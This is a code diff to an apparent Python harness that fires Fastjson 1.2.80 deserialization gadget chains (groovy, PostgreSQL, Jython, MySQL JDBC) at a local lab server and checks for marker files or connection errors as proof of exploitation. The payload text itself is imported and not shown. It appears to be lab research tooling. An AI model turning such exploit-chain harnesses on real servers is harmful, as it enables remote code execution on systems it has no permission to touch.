@@ -13,7 +13,7 @@ import httpx
 from fastjson_toolkit.poc.v1_2_80.catalog import GADGETS, get_gadget
 from fastjson_toolkit.poc.v1_2_80.payloads import build_steps
 
-ROOT = Path(__file__).resolve().parents[1]
+ROOT = Path(__file__).resolve().parents[2]
 LAB = ROOT / "lab" / "fastjson-1280-lab"
 PROOF = ROOT / "tmp_lab" / "1280_proof"
 BASE = "http://127.0.0.1:18280"
@@ -136,6 +136,8 @@ def main() -> int:
             content=entry.marker_content
             if name != "io_copy_write"
             else "FJ1280_READ_SRC\n",
+            host="127.0.0.1",
+            port=3308 if name == "mysql_jdbc" else 2333,
         )
         for i, s in enumerate(steps):
             (PROOF / f"{name}_step{i + 1}.json").write_text(s, encoding="utf-8")
@@ -144,9 +146,26 @@ def main() -> int:
             outs = post_steps(steps)
             for i, (code, text) in enumerate(outs):
                 print(f"    step{i + 1} http={code} {text[:120]}")
-            # groovy/pg 写文件可能略延迟
-            time.sleep(0.8 if name in ("groovy", "postgresql", "jython") else 0.3)
-            ok = marker_ok(name)
+            if name == "mysql_jdbc":
+                # 无恶意 MySQL 时以链触发连接/类路径加载为通过（非写文件）
+                blob = " ".join(t for _, t in outs)
+                ok = any(
+                    k.lower() in blob.lower()
+                    for k in (
+                        "JDBC4Connection",
+                        "CompressedInputStream",
+                        "CommunicationsException",
+                        "Connection refused",
+                        "SQLException",
+                        "create instance error",
+                        "Socket",
+                    )
+                ) or any(code >= 400 for code, _ in outs)
+                print(f"    mysql jdbc trigger check -> {ok}")
+            else:
+                # groovy/pg 写文件可能略延迟
+                time.sleep(0.8 if name in ("groovy", "postgresql", "jython") else 0.3)
+                ok = marker_ok(name)
         except Exception as exc:  # noqa: BLE001
             print(f"    exception: {exc}")
             ok = False
